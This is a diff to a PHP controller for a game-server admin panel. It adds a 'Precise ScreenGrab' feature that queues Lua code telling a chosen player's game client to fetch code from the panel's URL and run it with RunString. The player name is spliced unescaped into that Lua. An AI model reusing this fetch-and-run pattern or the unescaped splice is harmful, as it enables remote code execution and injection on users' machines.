@@ -284,7 +284,16 @@ class screenGrabber extends Controller
 
     }
 
-
+    /**
+     * Handles a pscrgrb request as detailed in routes/web.php
+     *
+     * @param $serverid
+     * @param Request $request
+     * @return Application|Factory|View|RedirectResponse
+     * @throws InvalidArgumentException
+     * @throws InvalidPacketException
+     * @throws SocketException
+     */
     public function selectPrecise($serverid, Request $request){
         //verify data consistency
         if(
@@ -352,11 +361,22 @@ class screenGrabber extends Controller
                         $first_valid->update();
 
                         //extract the json from string and create a collection
-
+                        $Players = collect(
+                          json_decode($first_valid->players_json)
+                        )->reject(function ($player) {
+                            return (!property_exists($player,"stmid")) or
+                                   (!property_exists($player,"snm")) or
+                                   $player->stmid === "BOT";
+                        }); //reject all players not corresponding to the lua payload and bots
 
                         //return to view with new collection and display players
-
-
+                        $type = "Precise";
+                        return view("scrgrb.playerselector", compact(
+                            'server',
+                            'serverid',
+                            'Players',
+                            'type'
+                        ));
                     }
 
                 }else{
@@ -410,7 +430,6 @@ class screenGrabber extends Controller
                 );
             }
 
-
         }
         else{
             return redirect()->back()->with(
@@ -419,6 +438,14 @@ class screenGrabber extends Controller
         }
     }
 
+    /**
+     * Saving a server's player-list info after a pscrgrb request
+     *
+     * @param $rkey
+     * @param Request $request
+     * @return string
+     * @throws \Exception
+     */
     public function savePlayerRequest($rkey, Request $request){
         $player_request = PSCRGRB_player_requests::where('PlayerRequestKey',$rkey);
         $currentDate = new DateTime( date('Y-m-d H:i:s') );
@@ -445,4 +472,78 @@ class screenGrabber extends Controller
 
     }
 
+    /**
+     * Handles the initial request for a Precise-ScreenGrab
+     *
+     * Verifies submitted data via post method.
+     * Verifies the ownership of the selected server, must be owned by the person doing the request.
+     * We generate a random key between 20 and 32 length.
+     * Creates a "request" with Scrgb_Image_Requests, saves the key with a request validity time of 1 hour.
+     * We send a payload in the queue telling the server to send custom lua code to the player.
+     * Since you can't send more than 255 bits of data via this method we tell the player to query an url and execute the code.
+     *
+     * @param $serverid
+     * @param Request $request
+     * @return RedirectResponse
+     */
+    public function sendPrecise($serverid, Request $request){
+        $customMessages = [
+            'required' => ':attribute is missing or the value is invalid.'
+        ];
+
+        $validator = Validator::make($request->all(), [
+            'player' => 'required|string',
+        ],$customMessages);
+        if ($validator->fails()) {
+            return redirect()->back()->with(
+                'status', 'Query invalid'
+            )->withErrors($validator);
+        }else {
+            $server = servers::where('id', $serverid);
+            //verify ownership of server and existence
+            if(
+                $server->count() == 1 &&
+                $server->first()->user_id == $request->user()->id
+            ){
+                $SCRGBrequest_key = Str::random(rand(20,32));
+
+                //creates new request
+                $SCRGB_request = new Scrgb_Image_Requests();
+                $SCRGB_request->SCRGBimageKey = $SCRGBrequest_key;
+                $SCRGB_request->RequestValidFor_Seconds = 3600;
+                $SCRGB_request->user_id = $request->user()->id;
+                $SCRGB_request->save();
+
+                //custom payload code | debug not working yet but it's not important, testing should be done with beta testers
+                $SCRGB_payload_code = '
+                    for i, v in ipairs( player.GetAll() ) do
+                        if v:SteamID() == "'.((self::$debug) ? "Maxime_48" : $request->player).'" then
+                            v:SendLua([[
+                                http.Fetch("'.route('getFastCode', ['key' => $SCRGBrequest_key]).'",function(a,b,c,d)RunString(a)end,function(e)print(e)end)
+                            ]])
+                        end
+                    end
+                ';
+
+                //registers new payload
+                $SCRGB_payload = new payloads_queue();
+                $SCRGB_payload->server_id = $serverid;
+                $SCRGB_payload->content = $SCRGB_payload_code;
+                $SCRGB_payload->description = "ScreenGrabber Payload by: " .
+                    $request->user()->name . " [" . $request->user()->id . "]" .
+                    " for " . $request->player . " on serverid " . $serverid;
+                $SCRGB_payload->save();
+
+                return redirect()->route("dashboard")->with(
+                    'status', 'Sent'
+                );
+            }else{
+                return redirect()->back()->with(
+                    'status', "It's not your server :("
+                );
+            }
+
+        }
+
+    }
 }
